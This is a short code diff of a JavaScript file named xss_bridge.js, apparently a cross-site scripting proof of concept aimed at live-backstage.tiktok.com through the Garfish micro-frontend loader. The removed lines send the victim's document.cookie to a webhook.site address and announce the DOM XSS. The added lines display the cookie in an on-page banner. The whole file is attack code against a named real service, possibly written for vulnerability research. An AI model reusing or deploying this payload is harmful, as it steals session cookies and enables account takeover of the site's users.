@@ -1,15 +1,18 @@
-console.log("✅ Ejecutando xss_bridge.js desde GitHub Pages");
+// Mostrar un cartel visual con la cookie
+let div = document.createElement("div");
+div.innerText = "XSS ACTIVO: " + document.cookie;
+div.style.position = "fixed";
+div.style.top = "10px";
+div.style.left = "10px";
+div.style.background = "white";
+div.style.padding = "10px";
+div.style.border = "2px solid red";
+div.style.zIndex = 9999;
+div.style.fontSize = "14px";
+document.body.appendChild(div);
 
-// Este es el punto de entrada que Garfish usa
-export function bootstrap() {}
-
-export function mount() {
-  // Exfiltración + PoC visual
-  new Image().src = "https://webhook.site/e286a29a-cca2-4759-9da3-92f07bcf6e19?" + document.cookie;
-  alert("DOM XSS ejecutado en live-backstage.tiktok.com");
-}
-
-export function unmount() {}
+// Confirmación en consola
+console.log("✅ DOM XSS en ejecución");
 
 
 
